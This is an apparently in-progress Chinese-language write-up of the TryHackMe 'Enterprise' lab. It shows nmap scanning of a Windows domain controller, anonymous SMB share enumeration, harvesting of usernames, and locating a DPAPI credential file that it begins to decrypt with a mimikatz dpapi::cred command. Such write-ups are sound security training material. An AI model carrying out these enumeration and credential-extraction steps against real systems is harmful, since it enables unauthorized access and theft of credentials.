# 服务探测

```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# nmap -sV -Pn 10.10.203.213      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 04:05 EST
Nmap scan report for 10.10.203.213
Host is up (0.23s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-03 09:05:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.81 seconds


```

## smb

枚举分项目录
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# crackmapexec smb 10.10.203.213 -u '' -p '' --shares
SMB         10.10.203.213   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.203.213   445    LAB-DC           [-] LAB.ENTERPRISE.THM\: STATUS_ACCESS_DENIED 
SMB         10.10.203.213   445    LAB-DC           [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

```

不允许匿名登录，但是得到了
域的名称：LAB.ENTERPRISE.THM 
DC服务器的名字： LAB-DC

用smbclient再次枚举，这次出现了分享的目录
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# smbclient --no-pass -L //10.10.203.213

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Docs            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      Users Share. Do Not Touch!
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.203.213 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

可以登录
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# smbclient --no-pass //10.10.203.213/Users
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Mar 11 21:11:49 2021
  ..                                 DR        0  Thu Mar 11 21:11:49 2021
  Administrator                       D        0  Thu Mar 11 16:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  atlbitbucket                        D        0  Thu Mar 11 17:53:06 2021
  bitbucket                           D        0  Thu Mar 11 21:11:51 2021
  Default                           DHR        0  Thu Mar 11 19:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  LAB-ADMIN                           D        0  Thu Mar 11 19:28:14 2021
  Public                             DR        0  Thu Mar 11 16:27:02 2021

                15587583 blocks of size 4096. 9920786 blocks available

```

整理一个user list
```
Administrator
atlbitbucket
bitbucket
LAB-ADMIN
```

找到一个用户凭据文件
```
smb: \LAB-ADMIN\AppData\Local\Microsoft\Credentials\> ls
  .                                 DSn        0  Thu Mar 11 19:28:46 2021
  ..                                DSn        0  Thu Mar 11 19:28:46 2021
  DFBE70A7E5CC19A398EBF1B96859CE5D   AHSn    11152  Thu Mar 11 18:09:04 2021

                15587583 blocks of size 4096. 9919566 blocks available
```

dpapi::cred /in:C:\Users\max\Desktop\1\DFBE70A7E5CC19A398EBF1B96859CE5D



guidMasterKey:{655a0446-8420-431a-a5d7-2d18eb87b9c3}

